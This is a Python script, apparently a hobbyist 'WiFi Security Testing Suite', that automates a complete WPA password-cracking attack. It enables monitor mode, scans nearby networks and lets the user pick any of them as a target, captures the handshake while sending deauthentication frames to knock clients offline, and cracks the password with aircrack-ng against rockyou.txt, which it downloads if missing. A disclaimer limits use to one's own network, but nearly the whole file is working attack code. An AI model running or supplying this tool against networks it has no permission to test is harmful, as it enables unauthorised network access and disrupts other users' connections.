#!/usr/bin/env python3
# ============================================================
#  brute.py  -  WiFi Security Testing Suite (Portable CLI)
#  Created by TucciCyberNation
#
#  FOR EDUCATIONAL PURPOSES AND PERSONAL USE ONLY.
#  Use ONLY on your own WiFi network / systems you own or
#  have explicit written permission to test. Unauthorized
#  access to networks is illegal in most jurisdictions
#  (e.g., Computer Fraud and Abuse Act, similar laws).
#
#  REQUIREMENTS: real Linux (Kali/Debian/Ubuntu), root,
#  a wireless adapter with monitor mode + injection.
#  Does NOT run in browser/WASM Python environments.
# ============================================================

import os
import sys
import time
import subprocess
import shutil
import re

REQUIRED_PACKAGES = ["requests"]  # keep minimal; heavy lifting via system tools

TOOL_BANNER = r"""
  ____              _    _____
 |  _ \            | |  |_   _|
 | |_) | ___   ___ | | __ | |  _ __  _   _ _ __
 |  _ < / _ \ / _ \| |/ / | | | '_ \| | | | '_ \
 | |_) | (_) | (_) |   < _| |_| | | | |_| | |_) |
 |____/ \___/ \___/|_|\_\_____|_| |_|\__,_| .__/
                                          | |  by TucciCyberNation
                                          |_|  WiFi Security Testing
"""


# ============================================================
#  PLATFORM CHECK + SAFE SUBPROCESS WRAPPER
# ============================================================
def check_platform():
    """Refuse to run on platforms that cannot spawn processes (e.g. WASM)."""
    if "emscripten" in sys.platform or "wasm" in sys.platform.lower():
        print("[!] FATAL: This environment is browser/WASM Python (emscripten).")
        print("    It cannot run subprocesses, WiFi tools, or monitor mode.")
        print("    Copy this file to a real Linux machine and run:")
        print("        sudo python3 brute.py")
        sys.exit(1)
    if sys.platform == "win32":
        print("[!] FATAL: Windows is not supported. Use Kali/Debian/Ubuntu Linux.")
        sys.exit(1)


def run_cmd(cmd, **kwargs):
    """subprocess.run that returns None instead of raising on unsupported envs."""
    try:
        return subprocess.run(cmd, **kwargs)
    except (OSError, subprocess.SubprocessError):
        return None


def banner():
    print(TOOL_BANNER)


def disclaimer():
    print("=" * 60)
    print(" DISCLAIMER - READ BEFORE CONTINUING")
    print("=" * 60)
    print(" This tool is for EDUCATIONAL purposes and for testing")
    print(" YOUR OWN WiFi network security, or recovering YOUR OWN")
    print(" lost WiFi passwords.")
    print("")
    print(" Using this tool on networks you do NOT own or do NOT")
    print(" have explicit permission to test is ILLEGAL.")
    print(" TucciCyberNation is not responsible for misuse.")
    print("=" * 60)
    try:
        resp = input("\nDo you understand and agree? (yes/no): ").strip().lower()
        if resp not in ("yes", "y"):
            print("Exiting. Stay legal.")
            sys.exit(0)
    except (KeyboardInterrupt, EOFError):
        sys.exit(0)


# ============================================================
#  STEP 0: PYTHON ENVIRONMENT SELF-SETUP
# ============================================================
def setup_environment():
    """Update pip and install required Python packages automatically."""
    print("\n[*] Setting up Python environment...")
    r = run_cmd([sys.executable, "-m", "pip", "install", "--upgrade", "pip"],
                check=False, capture_output=True)
    if r is not None and r.returncode == 0:
        print("[+] pip upgraded.")
    else:
        print("[!] pip upgrade failed (may need --user or root), continuing...")
    for pkg in REQUIRED_PACKAGES:
        run_cmd([sys.executable, "-m", "pip", "install", "--quiet", pkg],
                check=False)
        print(f"[+] Ensured package: {pkg}")


def check_root():
    if os.geteuid() != 0:
        print("[!] This tool must run as root (sudo). Exiting.")
        sys.exit(1)


def check_system_tools():
    """Verify required system tools exist, attempt auto-install of missing ones."""
    required = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
    missing = [t for t in required if shutil.which(t) is None]
    if missing:
        print(f"[*] Missing system tools: {missing}")
        print("[*] Attempting automatic installation via apt (Kali/Debian/Ubuntu)...")
        run_cmd(["apt-get", "update", "-y"], check=False, capture_output=True)
        r = run_cmd(["apt-get", "install", "-y", "aircrack-ng"],
                    check=False, capture_output=True)
        if r is None or r.returncode != 0:
            print("[!] Auto-install failed.")
            print("    Install manually:  sudo apt install aircrack-ng")
            sys.exit(1)
        print("[+] aircrack-ng suite installed.")
    else:
        print("[+] All aircrack-ng tools found.")


# ============================================================
#  STEP 1: ENABLE MONITOR MODE
# ============================================================
def list_wireless_interfaces():
    """Detect wireless interfaces via iw or /proc/net/wireless."""
    ifaces = []
    try:
        out = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        ifaces = re.findall(r"Interface\s+(\S+)", out)
    except (FileNotFoundError, OSError):
        try:
            with open("/proc/net/wireless") as f:
                for line in f.readlines()[2:]:
                    name = line.split(":")[0].strip()
                    if name:
                        ifaces.append(name)
        except (FileNotFoundError, OSError):
            pass
    return ifaces


def enable_monitor_mode():
    """Automatically pick a wireless card and switch to monitor mode."""
    ifaces = list_wireless_interfaces()
    if not ifaces:
        print("[!] No wireless interface detected. Connect a WiFi adapter.")
        sys.exit(1)

    print(f"[*] Detected interfaces: {ifaces}")
    iface = ifaces[0]
    if len(ifaces) > 1:
        iface = input("Choose interface (default: {}): ".format(ifaces[0])).strip() or ifaces[0]

    print(f"[*] Enabling monitor mode on {iface} ...")
    run_cmd(["airmon-ng", "check", "kill"], capture_output=True)
    run_cmd(["airmon-ng", "start", iface], capture_output=True)

    try:
        out = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
    except (FileNotFoundError, OSError):
        print("[!] iw not available - cannot verify monitor mode.")
        sys.exit(1)
    all_ifaces = re.findall(r"Interface\s+(\S+)", out)

    mon = iface + "mon"
    if mon in all_ifaces:
        print(f"[+] Monitor mode enabled: {mon}")
        return mon
    if iface in all_ifaces:
        out2 = subprocess.run(["iw", "dev", iface, "info"],
                              capture_output=True, text=True).stdout
        if "monitor" in out2:
            print(f"[+] {iface} already in monitor mode.")
            return iface
    for i in all_ifaces:
        if "mon" in i:
            print(f"[+] Monitor interface found: {i}")
            return i
    print("[!] Failed to enable monitor mode.")
    sys.exit(1)


# ============================================================
#  STEP 2: SCAN NETWORKS
# ============================================================
def scan_networks(mon_iface):
    """Scan for nearby APs and let user pick a target."""
    print(f"[*] Scanning on {mon_iface} for 15 seconds...")
    cap_file = "/tmp/scan_" + str(int(time.time()))
    proc = subprocess.Popen(
        ["airodump-ng", mon_iface, "-w", cap_file, "--output-format", "csv"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(15)
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
    time.sleep(2)

    csv_file = cap_file + "-01.csv"
    networks = []
    try:
        with open(csv_file, errors="replace") as f:
            in_ap_section = False
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if "Station MAC" in line:
                    break
                if "BSSID" in line:
                    in_ap_section = True
                    continue
                if in_ap_section:
                    parts = [p.strip() for p in line.split(",")]
                    # AP row: BSSID, FirstSeen, Power, #Beacons, #IV,
                    # LAN-IP, ID-length, ESSID, Key, Rates, ...
                    if len(parts) > 13 and parts[0]:
                        bssid = parts[0]
                        power = parts[2]
                        channel = parts[3]
                        id_len = parts[6]
                        essid = parts[13]
                        try:
                            if int(id_len) != len(essid):
                                essid = essid[:max(0, int(id_len))]
                        except ValueError:
                            pass
                        if essid:
                            networks.append({
                                "bssid": bssid,
                                "channel": channel,
                                "essid": essid,
                                "power": power
                            })
    except FileNotFoundError:
        print("[!] Scan failed - no CSV output.")
        sys.exit(1)

    # dedupe by BSSID
    seen = set()
    uniq = []
    for n in networks:
        if n["bssid"] not in seen:
            seen.add(n["bssid"])
            uniq.append(n)

    if not uniq:
        print("[!] No networks found. Try again.")
        sys.exit(1)

    print("\n[*] Available networks:")
    for idx, net in enumerate(uniq, 1):
        print(f"  [{idx}] ESSID: {net['essid']:<25} BSSID: {net['bssid']}"
              f"  CH: {net['channel']}  PWR: {net['power']}")

    choice = input("\nSelect target network number: ").strip()
    try:
        target = uniq[int(choice) - 1]
    except (ValueError, IndexError):
        print("[!] Invalid selection.")
        sys.exit(1)

    print(f"[+] Target locked: {target['essid']} ({target['bssid']})"
          f" on channel {target['channel']}")
    return target


# ============================================================
#  STEP 3: CAPTURE HANDSHAKE
# ============================================================
def capture_handshake(mon_iface, target):
    """Capture WPA handshake, with automatic deauth to force clients to reconnect."""
    bssid = target["bssid"]
    channel = target["channel"]
    essid = re.sub(r"\s+", "_", target["essid"])
    out_prefix = f"/tmp/handshake_{essid}"
    cap_file = out_prefix + "-01.cap"

    # remove stale captures so old handshakes aren't misdetected
    for suffix in ("-01.cap", "-01.csv", "-01.kismet.csv", "-01.log.csv"):
        try:
            os.remove(out_prefix + suffix)
        except FileNotFoundError:
            pass

    print("[*] Starting handshake capture...")
    dump = subprocess.Popen(
        ["airodump-ng", mon_iface, "-c", channel, "--bssid", bssid,
         "-w", out_prefix],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(8)

    deauth = None
    captured = False
    try:
        print("[*] Waiting for handshake (up to 60s). Sending deauth if needed...")
        deadline = time.time() + 60
        sent_deauth = False
        while time.time() < deadline:
            time.sleep(3)
            if not os.path.exists(cap_file):
                continue
            # Detect handshake in the capture file (exact match = real handshake)
            result = run_cmd(["aircrack-ng", "-w", os.devnull, cap_file],
                             capture_output=True, text=True)
            if result and "1 handshake" in result.stdout:
                print("[+] HANDSHAKE CAPTURED!")
                captured = True
                break
            if not sent_deauth and time.time() > deadline - 40:
                print("[*] Sending deauth to push clients to reconnect...")
                deauth = subprocess.Popen(
                    ["aireplay-ng", "--deauth", "4", "-a", bssid, mon_iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                sent_deauth = True
        if not captured:
            print("[!] No handshake captured. More clients may be needed.")
    finally:
        dump.terminate()
        try:
            dump.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump.kill()
        if deauth:
            deauth.terminate()
            try:
                deauth.wait(timeout=5)
            except subprocess.TimeoutExpired:
                deauth.kill()
        time.sleep(2)

    return cap_file if (captured and os.path.exists(cap_file)) else None


# ============================================================
#  STEP 4: DICTIONARY / BRUTE-FORCE CRACKING
# ============================================================
def crack_handshake(cap_file, wordlist, target):
    """Match captured hashes against the provided wordlist using aircrack-ng."""
    if not os.path.exists(cap_file):
        print(f"[!] Capture file not found: {cap_file}")
        return None
    if not os.path.exists(wordlist):
        print(f"[!] Wordlist not found: {wordlist}")
        print("[*] Attempting to download rockyou.txt ...")
        try:
            subprocess.run(
                [sys.executable, "-c",
                 "import urllib.request; urllib.request.urlretrieve("
                 "'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',"
                 "'/tmp/rockyou.txt')"],
                check=True)
            wordlist = "/tmp/rockyou.txt"
            print("[+] rockyou.txt downloaded to /tmp/rockyou.txt")
        except Exception as e:
            print(f"[!] Download failed: {e}")
            return None

    print(f"[*] Running dictionary attack with {wordlist} ...")
    result = run_cmd(["aircrack-ng", "-w", wordlist, "-b", target["bssid"], cap_file],
                     capture_output=True, text=True)
    if result is None:
        print("[!] aircrack-ng could not be executed.")
        return None

    out = result.stdout or ""
    print(out[-3000:] if len(out) > 3000 else out)
    match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
    if match:
        print("\n" + "=" * 50)
        print(f"[!!!] PASSWORD FOUND: {match.group(1)}")
        print("=" * 50)
        return match.group(1)
    print("[!] Password not found with this wordlist.")
    print("[*] Try a larger wordlist (e.g., rockyou.txt, hashcat rules).")
    return None


# ============================================================
#  MAIN - AUTOMATED STEP-BY-STEP PENTEST FLOW
# ============================================================
def main():
    banner()
    disclaimer()

    print("\n[*] STEP 0: Environment setup")
    setup_environment()
    check_root()
    check_system_tools()

    mon = None
    try:
        print("\n[*] STEP 1: Monitor mode")
        mon = enable_monitor_mode()

        print("\n[*] STEP 2: Network scan & target selection")
        target = scan_networks(mon)

        print("\n[*] STEP 3: Handshake capture")
        cap = capture_handshake(mon, target)
        if not cap:
            print("[!] Exiting - no handshake.")
            return

        print("\n[*] STEP 4: Cracking")
        wordlist = input("Path to wordlist (default /tmp/rockyou.txt): ").strip() \
            or "/tmp/rockyou.txt"
        password = crack_handshake(cap, wordlist, target)

        if password:
            print(f"\n[+] Your WiFi password is: {password}")
        else:
            print("\n[-] Test complete. Your network resisted this wordlist"
                  " (good sign).")
    finally:
        if mon:
            run_cmd(["airmon-ng", "stop", mon], capture_output=True)
        run_cmd(["service", "NetworkManager", "restart"], capture_output=True)
        print("[*] Monitor mode stopped, NetworkManager restarted.")


if __name__ == "__main__":
    check_platform()
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Cleaning up...")
        run_cmd(["airmon-ng", "check", "kill"], capture_output=True)
        run_cmd(["service", "NetworkManager", "restart"], capture_output=True)
        sys.exit(0)
